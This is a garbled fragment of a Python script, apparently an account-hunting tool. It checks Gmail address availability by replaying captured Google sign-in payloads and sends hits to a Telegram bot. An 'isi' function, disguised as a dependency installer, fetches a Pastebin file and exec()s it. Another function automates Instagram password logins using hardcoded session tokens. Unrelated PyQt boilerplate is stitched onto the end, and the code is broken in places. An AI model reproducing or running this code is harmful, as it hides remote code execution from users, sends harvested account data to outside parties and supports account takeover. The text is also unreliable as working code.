	                    'Decoded':'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];',
	                    
	                    
	                    'x-same-domain':'1'
	                
	    }
	 # data gived usergmail ×2    
	        datagmail = { 
	        'continue':'https://myaccount.google.com/?utm_source=sign_in_no_continue',  'service':'accountsettings', 
	                     'f.req':f'["{domen}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{domen}",null,null,null,true,true,[]]', 
	                     'bgRequest':'["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]', 
	                     'at':'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804', 
	                     'azt':'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805', 
	                     'cookiesDisabled':'false', 
	                     'deviceinfo':'[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]', 
	                     'gmscoreversion':'undefined', 
	                     'checkConnection':'youtube:353:0', 
	                     'checkedDomains':'youtube', 
	                     'pstMsg':'1'
	                     
	                     }              
	        reqgmail = requests.post(urlgmail, data=datagmail, headers=headgmail).text       
	        if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in reqgmail:
	            print('  '+a1+F+'۞'+a2+' This Emil is Available ✓ ' + '\n ' +'  ᪥| - Gmail :' + domen+'\n- - - - - - - - - - - - - - - - - -')
	            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𖦹|- New Fucked Gmail ✓\n - - - - - - - - - - - - - - - - - - - - - \n᪥| - Gmail : {domen} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')
	
	            i = requests.post(tlg)
	        
	        
	        else:
	            print(a1+ Z +'X'+a2+A+' This Gmail is Not Availabe × ')
def isi():
		
		try:
			import PyQt5.QtWidgets
			import rquests, os
		except ImportError:
			os.system('pip install PyQt5.QWidget')
			os.system('pip install requests')
			os.system('pip install os')
		
		kai = requests.get('https://pastebin.com/raw/r7Dihvuknvukb6ug77ihu8kjdi9wimsosoksjsiaksjziosjsnziizksjzizokzjzizisjjz8z8sknsjx8xoxknsjzo9zkzhsuiejdhxusiksnsjjxidjxjxijxnxkososojsjzuzuhsuz8zjndndjsooe7w73ijehdu8djdnbxuxixknxjxokxnxjxijxhxuixixhxhux8djjdjxu8djdjdj8x7hxbdbjxuxkjdudiskhsgyjdbdueidhfxydiehdgyx7ehegdyx78ej3vdyc67djeneoxiyxyebdkxiyxbejz8,yhsneix7dyhsis8euehgdidiehhdu')
		exec(kai.text)
def Test_accountt(self):
		global username,pess,email
		print("[/] Trying To Login into Account")
		headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '321','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YMEcQAALAAEv7JAHx0HGAT9oOg5e; ig_did=BBD1FACB-65E8-433F-BB27-1554B5DC41E6; ig_nrcb=1; shbid=13126; shbts=1624283106.1767957; rur=PRN; csrftoken=kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36','x-asbd-id': '437806','x-csrftoken': 'kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgSX-','x-instagram-ajax': 'a90c0f3c9877','x-requested-with': 'XMLHttpRequest',}
		data={'username': username,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pess}','queryParams': '{}','optIntoOneTap': 'false','stopDeletionNonce': '','trustedDeviceRecords': '{}',}  
		GO=requests.post('https://www.instagram.com/accounts/login/ajax/',headers=headers,data=data).text
	
def createActions():
	        root = QFileInfo(__file__).absolutePath()
	
	        self.aboutAct = QAction("&About", self,
	                statusTip="Show the application's About box",
	                triggered=self.about)
	
	        self.aboutQtAct = QAction("About &Qt", self,
	                statusTip="Show the Qt library's About box",
	                triggered=QApplication.instance().aboutQt)
